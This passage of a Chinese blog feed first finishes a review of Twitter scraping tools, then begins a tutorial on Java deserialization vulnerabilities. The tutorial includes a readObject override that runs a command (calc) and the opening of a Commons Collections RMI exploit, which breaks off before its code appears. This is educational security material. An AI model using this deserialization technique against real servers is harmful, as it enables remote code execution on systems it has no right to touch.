10060] 由于连接方在一段时间</span></span><br><span class="line"><span class="string">后没有正确答复或连接的主机没有反应，连接尝试失败。&#x27;</span>)) <span class="keyword">while</span> requesting <span class="string">&quot;https://twitter.com/search?f=tweets&amp;vertical=defa</span></span><br><span class="line"><span class="string">ult&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None&quot;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connection.py&quot;</span>, line 174, <span class="keyword">in</span> _new_conn</span><br><span class="line">    conn = connection.create_connection(</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 96, <span class="keyword">in</span> create_connection</span><br><span class="line">    raise err</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 86, <span class="keyword">in</span> create_connection</span><br><span class="line">    sock.connect(sa)</span><br><span class="line">TimeoutError: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。</span><br></pre></td></tr></table></figure></li><li><p>总结 </p><p> 翻了翻 issue：没法用，等更新。</p></li></ol><h2 id="Scweet"><a href="#Scweet" class="headerlink" title="Scweet"></a><a href="https://github.com/Altimis/Scweet">Scweet</a></h2><p>支持关键词、标签、时间范围等搜索选项，也支持用户信息、关注、关注者的爬取。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scweet==1.6</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 用 selenium 模拟浏览器访问，竟然还不是 headless 模式，直接给我弹出一个窗口可还行。注意这里不是本地时间，是 UTC 时间；存储格式为 UTF-8。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Scweet.scweet <span class="keyword">import</span> scrape</span><br><span class="line"></span><br><span class="line">data = scrape(words=[<span class="string">&quot;nijisanji&quot;</span>], since=<span class="string">&quot;2020-01-01&quot;</span>, until=<span class="string">&quot;2021-01-01&quot;</span>, from_account=<span class="literal">None</span>,</span><br><span class="line">            interval=<span class="number">1</span>,</span><br><span class="line">            headless=<span class="literal">False</span>, display_type=<span class="string">&quot;Latest&quot;</span>, save_images=<span class="literal">False</span>, proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>, save_dir=<span class="string">&#x27;outputs&#x27;</span>,</span><br><span class="line">            resume=<span class="literal">False</span>, filter_replies=<span class="literal">True</span>, proximity=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p> 结果爬了 175 条数据</p> <img src="https://i.loli.net/2021/10/11/iO3AjzBJUMm8th4.png"></li><li><p>总结</p><p> 可以用！暂时没遇到什么问题，用它！</p></li></ol><h2 id="SearchTT"><a href="#SearchTT" class="headerlink" title="SearchTT"></a><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></h2><p>还写了一篇知乎文章：<a href="https://zhuanlan.zhihu.com/p/87931509">这可能是是中文网上关于Twitter信息检索爬虫最全的项目了</a></p><p>描述含糊、仓库不更新、甚至还曾出租 API（评论里看起来可能是），拉倒🙂。</p><h2 id="Twitter-Hashtag-crawler"><a href="#Twitter-Hashtag-crawler" class="headerlink" title="Twitter Hashtag crawler"></a><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></h2><p>根据标签（hashtag）搜索</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/amitupreti/Hands-on-WebScraping</span><br><span class="line"><span class="built_in">cd</span> Hands-on-WebScraping/project1_twitter_hashtag_crawler</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p> 报错</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Could not find a version that satisfies the requirement dateutil (from versions: none)</span><br><span class="line">ERROR: No matching distribution found <span class="keyword">for</span> dateutil</span><br></pre></td></tr></table></figure><p> 但是本地已经有了 dateutil</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install python-dateutil --upgrade</span><br><span class="line"><span class="comment"># Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: python-dateutil in c:\users\linki\desktop\t\lib\site-packages (2.8.2)</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: six&gt;=1.5 in c:\users\linki\desktop\t\lib\site-packages (from python-dateutil) (1.16.0)</span></span><br></pre></td></tr></table></figure><p> 直接装个 scrapy 得了</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">pip install ipdb</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 没有给代理配置的入口，显然连不上</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl twittercrawler -a filename=myhashtags.csv -o mydata.csv</span><br></pre></td></tr></table></figure></li><li><p>总结</p><p> 能够自定义的配置项太少，而且仅针对标签搜索，跳过。</p></li></ol><h2 id="stweet"><a href="#stweet" class="headerlink" title="stweet"></a><a href="https://github.com/markowanga/stweet">stweet</a></h2><p>支持推特的高级搜索选项，同时支持推文和用户信息的爬取，stweet/docs/notebooks/ 目录下有各种示例。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install stweet</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 提供许多配置项，非常友好</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> arrow</span><br><span class="line"><span class="keyword">import</span> stweet <span class="keyword">as</span> st</span><br><span class="line"></span><br><span class="line">ProxyConfig = st.RequestsWebClientProxyConfig(</span><br><span class="line">    http_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>,</span><br><span class="line">    https_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">since = arrow.get(<span class="string">&#x27;2021-10-01&#x27;</span>)</span><br><span class="line">until = arrow.get(<span class="string">&#x27;2021-10-02&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_tweets_task = st.SearchTweetsTask(</span><br><span class="line">    exact_words=<span class="string">&quot;nijisanji&quot;</span>,</span><br><span class="line">    since=since,</span><br><span class="line">    until=until,</span><br><span class="line">    replies_filter=st.RepliesFilter.ONLY_ORIGINAL,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">st.TweetSearchRunner(</span><br><span class="line">    search_tweets_task=search_tweets_task,</span><br><span class="line">    tweet_outputs=[st.CsvTweetOutput(<span class="string">&#x27;nijisanji_20211001_20211002.csv&#x27;</span>), st.PrintTweetOutput()],</span><br><span class="line">    web_client=st.RequestsWebClient(proxy=ProxyConfig, verify=<span class="literal">False</span>),</span><br><span class="line">).run()</span><br></pre></td></tr></table></figure><p> 不碍事儿的警告</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;127.0.0.1&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">warnings.warn(</span><br></pre></td></tr></table></figure><p> 添加以下语句关闭</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure><p> 爬得非常快，字段也比 scweet 收集的多，但是只有 2021.10.02 的数据，难道时间范围是左开右闭的。多试几次发现爬太快了提示 <code>远程主机强迫关闭了一个现有的连接</code>，而且每次爬取的结果都不一样…</p> <img src="https://i.loli.net/2021/10/11/cXw9h8bOK1EAYjQ.png"></li></ol><ol start="3"><li><p>总结</p><p> 虽然能用但有点问题，作者正在准备 stweet 2.0，等推出之后再进行尝试。</p></li><li><p>更新</p><p> 2021.10.14 更新 stweet 2.0，说明文档还不够完善，如何使用的例子也没有。<br> 2021.10.15 测试了一下，可以爬取推文数据和用户数据否，但是现在只支持保存 JSON 格式的文件（因为没写解析），重复爬取了几次从文件大小上看都一样，所以应该没问题了。可以再等等完善。</p></li></ol><h2 id="Web-Scraping-Tweet-Traffic"><a href="#Web-Scraping-Tweet-Traffic" class="headerlink" title="Web_Scraping_Tweet_Traffic"></a><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></h2><p>配合文章食用：</p><ul><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-1-b3e2db29051d">Web Scrape Twitter by Python Selenium (Part 1)</a></li><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-2-c22ae3e78e03">Web Scrape Twitter by Python Selenium (Part 2)</a></li></ul><p>该仓库已于 2019 年停更，可作为爬取思路的学习材料。</p><h1 id="在线爬取"><a href="#在线爬取" class="headerlink" title="在线爬取"></a>在线爬取</h1><p><a href="https://www.vicinitas.io/free-tools/download-search-tweets">https://www.vicinitas.io/free-tools/download-search-tweets</a> ，需要推特账户登陆后爬取，可以一试。</p><img src="https://i.loli.net/2021/10/11/ckCoM9PsF18huad.jpg">]]></content>
    
    
    <summary type="html">挂个代理直接爬取</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Java 反序列化漏洞入门</title>
    <link href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/"/>
    <id>https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/</id>
    <published>2021-09-16T03:41:30.000Z</published>
    <updated>2021-11-12T02:03:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化漏洞"><a href="#Java-反序列化漏洞" class="headerlink" title="Java 反序列化漏洞"></a>Java 反序列化漏洞</h1><div class="note info flat"><p>利用方法多、造成危害有大有小；没有效果很好的检测工具，通常是有经验的从业人员发现。</p></div><p>序列化：把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream 类的 <code>writeObject()</code> 方法可以实现序列化。</p><p>反序列化：把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 <code>readObject()</code> 方法用于反序列化。</p><p>漏洞成因：攻击者通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的恶意代码。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="重写-readObject-方法"><a href="#重写-readObject-方法" class="headerlink" title="重写 readObject 方法"></a>重写 readObject 方法</h3><p>默认的序列化与反序列化操作，实现的效果就是写入文件和从文件中读取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 定义 obj 对象</span></span><br><span class="line">        String obj = <span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个包含对象进行序列化信息的 object 数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() 方法将 obj 对象写入 object 文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从文件中反序列化 obj 对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 恢复对象</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看 object 文件中的内容（序列化的 obj）</p><ul><li><code>0xaced</code> 为 Java 对象序列化流的魔数，<code>0x0005</code> 为 Java 对象序列化的版本号，Java 对象序列化数据的前 4 个字节为 <code>AC ED 00 05</code></li></ul><img src="https://i.loli.net/2021/09/16/OD7GcKlSnPauLI4.png" ><p>重写 readObject 函数，在其中调用计算器</p><ul><li>只有实现 Serializable 接口的类的对象才可以被序列化</li><li>重写了 <code>readObject()</code> 函数</li><li>默认的写方法 <code>writeObject()</code> 可以将非静态和非 transient 的字段序列化<ul><li>简单的对象序列化操作用默认方法即可</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 定义 myObj 对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个包含对象进行反序列化信息的 myobject 数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() 方法将 myObj 对象写入 myobject 文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从文件中反序列化 obj 对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 恢复对象</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 readObject() 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行默认的 readObject() 方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行该程序，在控制台输出 <code>hi</code> 并弹出计算器</p><img src="https://i.loli.net/2021/09/16/wFJmiW5eLQcaOkv.jpg"><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI（Remote Method Invocation）：一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为 JRMP（Java Remote Message Protocol ，Java 远程消息交换协议）以及 CORBA。</p><img src="https://i.loli.net/2021/09/16/5uDiW4J7vPRMHAX.png" ><p>简单理解：服务器将提供的服务对象注册到注册表中，客户端查询注册表获得对象并调用</p><ol><li>服务端 Server.java 创建注册表，注册服务对象 <code>hello</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> service.impl.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        Hello hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 生成存根（Stub）</span></span><br><span class="line">        UnicastRemoteObject.exportObject(hello,<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建本机 1099 端口上的 RMI registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对象绑定到注册表中</span></span><br><span class="line">        registry.rebind(name, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>远程接口定义及实现</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.java</span></span><br><span class="line"><span class="keyword">package</span> service;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloImpl</span></span><br><span class="line"><span class="keyword">package</span> service.impl;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;quit&quot;</span>.equalsIgnoreCase(message.toString()))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Server will be shutdown!&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Message from client: &quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Server response:&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>客户端 Client.java 调用远程对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 获取远程主机上的注册表</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取远程对象</span></span><br><span class="line">        Hello hello = (Hello)registry.lookup(name);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner( System.in ); <span class="comment">// 读取输入</span></span><br><span class="line">            String message = sc.next();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 调用远程方法</span></span><br><span class="line">            hello.echo(message);</span><br><span class="line">            <span class="keyword">if</span>(message.equals(<span class="string">&quot;quit&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行 Server 提供 Hello 服务，运行 Client 查询 hello 远程服务对象，读取控制台运行并调用。</p><img src="https://i.loli.net/2021/09/16/eJc36u7bRKvmaSE.jpg" ><img src="https://i.loli.net/2021/09/16/cf2Qm6FZzPjOKax.jpg" ><h3 id="RMI-反序列化漏洞（CC5）"><a href="#RMI-反序列化漏洞（CC5）" class="headerlink" title="RMI 反序列化漏洞（CC5）"></a>RMI 反序列化漏洞（CC5）</h3><blockquote><p> 利用了 CommonsCollections5<br> jdk1.8 之后对 AnnotationInvocationHandler 类做了限制，所以在 jdk1.8 版本就拿 BadAttributeValueExpException 进行替代</p></blockquote><p>漏洞成因：RMI 在传输数据的时候，会将数据序列化，在传输完成后再进行反序列化；客户端提供构造好的恶意数据，服务器端接收后进行反序列化触发代码执行。</p><ul><li>能够进行 RMI 通信</li><li>服务器引用第三方存在反序列化漏洞的包</li></ul><p>结合 Apache Commons Collections 反序列化漏洞，构造 POC</p><ul><li>jdk 8u121以下（这里选择 8u111 复现）</li><li><a href="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar">commons-collections-3.1.jar</a></li></ul><p>Server 和服务仍然使用上面的代码，修改 Client 的逻辑，构造能够触发代码执行的序列化对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 